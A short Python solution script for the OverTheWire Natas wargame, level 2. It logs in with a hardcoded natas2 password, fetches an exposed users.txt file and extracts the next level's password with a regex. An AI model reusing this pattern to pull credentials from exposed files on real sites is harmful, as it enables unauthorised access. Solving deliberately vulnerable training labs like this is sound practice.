#!/usr/bin/env python3
# request with basic authentication

import requests
import re

username = 'natas2'
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

url = f'http://{username}.natas.labs.overthewire.org/files/users.txt'
#print (url)

response = requests.get(url, auth = (username, password))

print (response.text)
# het resultaat bevat het password
password_list = re.findall("natas3:(.*)", response.text)

# initialize an empty string
str1 = " " 
    
# return string  
new_password = str1.join(password_list)


print(new_password)